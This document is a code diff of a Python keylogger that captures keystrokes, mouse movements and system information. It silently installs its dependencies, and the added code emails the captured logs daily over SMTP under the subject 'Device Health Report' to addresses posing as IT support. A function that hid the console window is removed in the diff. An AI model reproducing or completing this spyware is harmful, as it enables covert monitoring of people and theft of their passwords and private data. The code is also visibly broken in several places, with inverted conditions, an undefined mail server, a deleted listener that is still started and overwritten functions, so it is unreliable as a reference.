@@ -1,5 +1,5 @@
 try:
-    import datetime
+    from datetime import datetime
     from email.mime.multipart import MIMEMultipart
     from email.mime.text import MIMEText
     import platform
@@ -13,6 +13,25 @@ except ModuleNotFoundError:
     modules = ["pyscreenshot","sounddevice","pynput"]
     call("pip install " + ' '.join(modules), shell=True)
 
+global log_data
+log_data = ""
+
+def main():
+    report_interval = 86400 #86400 is 24 hours in secs
+    start_logger()
+
+    Life = True;
+    while Life:
+        try:
+            sys_info = gather_system_info()
+            keyboard_info = keyboard_info()
+            mouse_info = mouse_info()
+            report_file = save_report(sys_info)
+            send_report(report_file)
+        except Exception as E:
+                pass
+                #Kill itself?
+        time.sleep(report_interval) 
 
 
 key_data = ""
@@ -45,27 +64,27 @@ def send_report(filename):
     sender_email = "it-monitor@yourcompany.com"
     receiver_email = "it-support@yourcompany.com"
     password = "your_secure_password" 
-    pass 
-    #Would've send it but we don't have an email
+
+    msg = MIMEMultipart()
+    msg["From"] = sender_email
+    msg["To"] = receiver_email
+    msg["Subject"] = f"Device Health Report - {socket.gethostname()}"
 
 
-def main():
-    report_interval = 86400 #86400 is 24 hours in secs
-    start_logger()
+    with open(filename, "r") as f:
+        report_content = f.read()
 
-    Life = True;
-    while Life:
-        try:
-            sys_info = gather_system_info()
-            keyboard_info = keyboard_info()
-            mouse_info = mouse_info()
-            report_file = save_report(sys_info)
-            send_report(report_file)
-        except Exception as E:
-                pass
-                #Kill itself?
-        time.sleep(report_interval) 
+    msg.attach(MIMEText(report_content, "plain"))
 
+    try:
+        server = smtplib.SMTP(smtp_server, port)
+        server.starttls()
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, msg.as_string())
+        server.quit()
+        print("Device health report successfully sent to IT.")
+    except Exception as e:
+        print(f"Failed to send report: {e}")
 
 
 
@@ -88,6 +107,7 @@ mouse_listener = None
 keyboard_listener = None
 
 def on_press(key):
+    log_data = ""
     try:
         log_data += f"[{time.strftime('%H:%M:%S')}] Key: {key.char}\n"
         print(f'Key pressed: {key.char} - {get_timestamp()}')
@@ -95,7 +115,7 @@ def on_press(key):
         log_data += f"[{time.strftime('%H:%M:%S')}] Special Key: {key}\n"
         print(f'Special key pressed: {key} - {get_timestamp()}')
 
-    if len(log_data) > 500:
+    if len(log_data) < 500:
         with open("logfile.txt", "a") as f:
             f.write(log_data)
         log_data = ""
@@ -103,22 +123,19 @@ def on_press(key):
     if key == keyboard.Key.esc:
         print("Exiting listeners...")
         if mouse_listener:
-            mouse_listener.stop()  # Stop the mouse listener
+            mouse_listener.stop() 
+             # Stop the mouse listener
         if keyboard_listener:
             keyboard_listener.stop()
-        return False               # Stop the keyboard listener
+        return False
+               # Stop the keyboard listener
+    
 
 
 
 
-def hide_console():
-    import win32console
-    import win32gui
-    win = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(win, 0)
 
 def start_logger():
-    hide_console()
 
     mouse_listener = mouse.Listener(
     on_move=on_move, 
@@ -129,7 +146,6 @@ def start_logger():
     on_press=on_press
 )
 
-    keyboard_listener = keyboard.Listener(on_press=on_key_press)
     keyboard_listener.start()
     mouse_listener.start()
     keyboard_listener.join()
@@ -137,4 +153,3 @@ def start_logger():
 
 main()
 start_logger()
-log_traffic()
